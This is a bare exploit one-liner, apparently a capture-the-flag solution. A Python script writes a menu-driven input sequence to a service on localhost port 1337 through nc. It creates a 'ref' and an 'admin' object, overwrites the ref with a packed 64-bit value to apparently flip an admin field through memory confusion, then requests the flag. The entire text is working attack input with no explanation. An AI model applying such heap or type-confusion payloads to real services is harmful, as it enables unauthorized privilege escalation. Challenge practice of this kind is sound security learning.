```py
python3 -c "
import sys
sys.stdout.buffer.write(b'5\n')            # new ref
sys.stdout.buffer.write(b'8\n')            # new admin
sys.stdout.buffer.write(b'7\n0\n8\n')      # edit ref, idx=0, len=8
import struct
sys.stdout.buffer.write(struct.pack('<Q', 1))
sys.stdout.buffer.write(b'\n')             # trailing newline (discard)
sys.stdout.buffer.write(b'9\n0\n')         # show admin
sys.stdout.buffer.write(b'10\n0\n')        # get flag
sys.stdout.buffer.write(b'0\n')
" | nc localhost 1337
```
